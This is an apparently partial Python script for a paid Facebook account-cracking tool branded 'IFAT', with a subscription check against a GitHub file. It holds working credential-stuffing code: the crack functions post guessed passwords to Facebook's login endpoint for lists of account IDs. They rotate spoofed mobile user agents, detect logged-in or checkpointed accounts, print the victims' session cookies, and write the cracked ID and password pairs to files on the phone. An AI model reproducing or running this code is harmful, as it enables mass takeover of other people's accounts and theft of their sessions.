...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi 10 Pro Build/MBFMIEK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.365",]
ua = ["Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro Build/SQ3A.220605.009.B1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-J330FN Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3830 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101",]
ugen2=[]
ugen=[]
cokbrut=[]
...
logo =""" 
 ...
 '\033[1;35m'██╗'\033[1;34m'███████╗ '\033[1;97m' █████╗ '\033[1;91m'████████╗
 '\033[1;35m'██║'\033[1;34m'██╔════╝ '\033[1;97m'██╔══██╗'\033[1;91m'╚══██╔══╝
 '\033[1;35m'██║'\033[1;34m'█████╗   '\033[1;97m'███████║   '\033[1;91m'██║   
 '\033[1;35m'██║'\033[1;34m'██╔══╝   '\033[1;97m'██╔══██║  '\033[1;91m' ██║   
 '\033[1;35m'██║'\033[1;34m'██║      '\033[1;97m'██║  ██║   '\033[1;91m'██║   
 '\033[1;35m'╚═╝'\033[1;34m'╚═╝      '\033[1;97m'╚═╝  ╚═╝  	╚═╝   
 ...
 '\033[1;35m'╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 '\033[1;35m'║\33[0;47m    [ WORKING  Mobile  DATA + WIFI]        	\033[0;95m║
 '\033[1;35m'╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-----------------------------------------------    
\33[1;97m[+] Author   :  TEAM  71
\33[1;96m[+] WhatsApp : 01623689004
\33[1;95m[+] Network  : (5G/6G/WIFI)>[ON]
\33[1;94m[+] ToolTyp  : Paid 
\33[1;30m[+] GitHub   : IFAT-KING
\33[1;39m[+] VERSION  : 0.1
-----------------------------------------------"""
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/IFAT125/Approval2.txt/blob/main/Approved").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m IFAT TooLs Daily Update)✅ \033[0;95m")
...
os.system('espeak -a 300 " Welcome,   to,   IFAT PAID  Tools"')
pass
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/✮⃝IFAT𝄟⃝🔵.txt  Etc...]')
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/IFAT.King.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[✮⃝IFAT𝄟⃝🔵•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[✮⃝IFAT𝄟⃝🔵•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mIFAT-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/IFAT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;95m✮⃝IFAT𝄟⃝🔵-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[✮⃝IFAT𝄟⃝🔵\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " IFAT,  Ok,  id"')
                open('/sdcard/✮⃝IFAT𝄟⃝🔵-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[✮⃝IFAT𝄟⃝🔵-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mIFAT-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/✮⃝IFAT𝄟⃝🔵-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0;95m✮⃝IFAT𝄟⃝🔵-Ok] {idf} \033[0;97m• \033[0;95m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " ✮⃝IFAT𝄟⃝🔵,  Ok,  id"')
                open('/sdcard/✮⃝IFAT𝄟⃝🔵-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
